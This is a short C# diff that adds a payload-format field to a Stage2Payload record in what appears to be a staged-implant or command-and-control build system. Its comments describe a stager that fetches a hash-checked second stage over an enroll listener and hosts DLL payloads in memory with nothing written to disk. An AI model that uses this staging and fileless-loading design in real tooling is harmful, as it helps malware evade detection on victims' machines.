@@ -75,8 +75,13 @@ public sealed record BuildParams(
 /// the stager fetches over the enroll listener, plus the payload's sha256
 /// fingerprint baked in as the fetch's integrity check. The bytes themselves
 /// stay server-side in the payload store -- only the reference crosses the
-/// build contract.
+/// build contract. <see cref="Format"/> names the referenced payload's form
+/// factor, because the loader's run path follows it: a dll bundle is hosted
+/// in the stager's process (in-memory, no bytes on disk), an executable form
+/// runs as the child. Defaults to the single-file executable every stage-2
+/// produced before the format axis existed.
 /// </summary>
 public sealed record Stage2Payload(
     Guid PayloadId,
-    string Sha256);
+    string Sha256,
+    ArtifactFormat Format = ArtifactFormat.SingleFileExe);
